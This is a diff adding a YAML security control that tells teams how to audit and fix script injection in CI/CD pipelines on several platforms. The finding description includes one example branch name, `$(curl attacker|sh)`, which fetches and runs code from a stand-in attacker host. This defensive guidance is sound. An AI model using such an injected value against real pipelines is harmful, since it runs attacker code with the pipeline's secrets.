@@ -1,0 +1,137 @@
+# yaml-language-server: $schema=../../../../schema/control.schema.json
+id: CB-CICD-PIPE-015
+title: Pass untrusted values to pipeline scripts only through quoted variables
+finding:
+  title: Pipeline scripts interpolate attacker-controlled values into commands
+  description: Branch names, commit messages, pull request titles or issue text are expanded into a shell command or a template before it runs, so a crafted value such as a branch named `$(curl attacker|sh)` executes in the job with its secrets.
+status: draft
+profiles: [baseline]
+risk:
+  severity: high
+assessment: manual
+tags: [script-injection, template-injection, untrusted-input, expression-injection]
+
+description: |
+  Values that a contributor or outside user can set (commit messages, branch and tag names, pull
+  or merge request titles and descriptions, issue and comment text, labels, workflow inputs from
+  untrusted sources, artifact content) reach scripts only as environment variables used inside
+  double quotes, or as typed parameters with validation. They are never expanded by the pipeline
+  templating language into the script text, never passed to `eval`, and never written to the
+  runner's environment or path files (`GITHUB_ENV`, `GITHUB_PATH`) in privileged workflows.
+
+  Secrets in command lines are covered by CB-CICD-SEC-023; restricting runtime variable overrides by
+  CB-CICD-PIPE-016.
+rationale: |
+  Template expansion happens before the shell parses the command, so quoting inside the script
+  does not help: the attacker's text becomes code. Writing such values to the runner environment
+  files lets an attacker set `LD_PRELOAD`, `BASH_ENV` or `NODE_OPTIONS` and run code in later steps.
+  Passing values as quoted variables keeps them data.
+impact: |
+  Existing scripts need to be rewritten to use environment variables. Azure DevOps shell argument
+  validation can break tasks that relied on shell metacharacters in arguments.
+
+audit:
+  manual: |
+    Use read access to the pipeline files. Run zizmor (`template-injection`, `github-env`),
+    poutine (`injection`) or Checkov (`CKV_GHA_2`, `CKV_CIRCLECIPIPELINES_6`) as a help.
+
+    1. Search pipeline files for untrusted values used directly in commands:
+       - **GitHub / Gitea / Forgejo**: `${{ github.event.* }}`, `${{ github.head_ref }}` or
+         untrusted `inputs.*` inside `run:` or `actions/github-script` `script:`; writes to
+         `$GITHUB_ENV` or `$GITHUB_PATH` derived from pull request, issue or artifact content in
+         privileged workflows.
+       - **GitLab**: `$CI_COMMIT_MESSAGE`, `$CI_COMMIT_TITLE`, `$CI_MERGE_REQUEST_TITLE`,
+         `$CI_MERGE_REQUEST_DESCRIPTION`, `$CI_COMMIT_BRANCH` or
+         `$CI_MERGE_REQUEST_SOURCE_BRANCH_NAME` used unquoted or in `eval`.
+       - **Azure DevOps**: `$(Build.SourceBranchName)`, `$(Build.SourceBranch)`,
+         `$(Build.SourceVersionMessage)` or `$(System.PullRequest.SourceBranch)` macro syntax in
+         `script`, `bash`, `pwsh` or `powershell` steps; **Organization settings** > **Pipelines** >
+         **Settings** > **Enable shell tasks arguments validation** is on.
+       - **Jenkins**: `sh`, `bat`, `powershell` or `pwsh` steps use Groovy double-quoted strings
+         (`"... ${params.X} ..."`) with user-controlled values or credentials.
+       - **Woodpecker**: `${CI_COMMIT_MESSAGE}`, `${CI_COMMIT_AUTHOR}` or
+         `${CI_COMMIT_PULL_REQUEST_LABELS}` substituted in `commands:` instead of read from the
+         environment.
+       - **Buildkite**: attacker-controlled values interpolated at `buildkite-agent pipeline upload`
+         instead of escaped with `$$` or uploaded with interpolation disabled.
+       - **CircleCI**: untrusted pipeline values used directly in `run:` commands.
+    2. Fail if an untrusted value is expanded into a command, evaluated, or written to the runner
+       environment or path files in a privileged workflow.
+
+remediation:
+  manual: |
+    1. Move each untrusted value into an environment variable set by the pipeline (`env:`,
+       `variables:`, `environment:`) and use it as `"$VAR"` in the script.
+    2. Where the platform has typed inputs, declare the parameter with a type and allowed values or
+       a pattern.
+    3. Per platform:
+       - **GitHub**: replace `${{ ... }}` in `run:` with `env:` entries; do not write untrusted data
+         to `$GITHUB_ENV` or `$GITHUB_PATH`.
+       - **Azure DevOps**: turn on **Enable shell tasks arguments validation** at organization or
+         project level and pass values through `env:`.
+       - **Jenkins**: use single-quoted strings (`sh 'echo "$BRANCH"'`) and pass values through
+         `withEnv` or parameters.
+       - **Buildkite**: escape runtime variables with `$$` or disable interpolation for the
+         upload.
+    4. Add a workflow linter to the pipeline repository checks (CB-CICD-TEST-004).
+
+references:
+  - title: Script injections
+    url: https://docs.github.com/en/actions/concepts/security/script-injections
+    publisher: GitHub
+    kind: vendor-doc
+    accessed: 2026-11-03
+  - title: Secure inputs and parameters in Azure Pipelines
+    url: https://learn.microsoft.com/azure/devops/pipelines/security/inputs
+    publisher: Microsoft
+    kind: vendor-doc
+    accessed: 2026-11-03
+  - title: Using a Jenkinsfile - injection via interpolation
+    url: https://www.jenkins.io/doc/book/pipeline/jenkinsfile/
+    publisher: Jenkins
+    kind: vendor-doc
+    accessed: 2026-11-03
+  - title: Predefined CI/CD variables reference
+    url: https://docs.gitlab.com/ci/variables/predefined_variables/
+    publisher: GitLab
+    kind: vendor-doc
+    accessed: 2026-11-03
+  - title: buildkite-agent pipeline (environment variable substitution)
+    url: https://buildkite.com/docs/agent/cli/reference/pipeline
+    publisher: Buildkite
+    kind: vendor-doc
+    accessed: 2026-11-03
+  - title: zizmor audit rules
+    url: https://docs.zizmor.sh/audits/
+    publisher: zizmor
+    kind: tool
+    accessed: 2026-11-03
+mappings:
+  - framework: owasp-cicd-top10
+    framework_version: "2022"
+    id: CICD-SEC-04
+    relation: partial
+    note: Covers code execution through injected values rather than modified pipeline files.
+  - framework: nist-800-53r5
+    framework_version: "5.1.1"
+    id: SI-10
+    relation: related
+threats:
+  - framework: mitre-attack
+    id: T1059
+  - framework: mitre-attack
+    id: T1195.002
+related_controls:
+  - id: CB-CICD-PIPE-016
+    type: related
+  - id: CB-CICD-PIPE-014
+    type: related
+  - id: CB-CICD-TEST-004
+    type: related
+
+authors:
+  - name: Alice
+    github: Sn0wAlice
+introduced_in: 0.1.0
+created: 2026-11-03
+updated: 2026-11-03
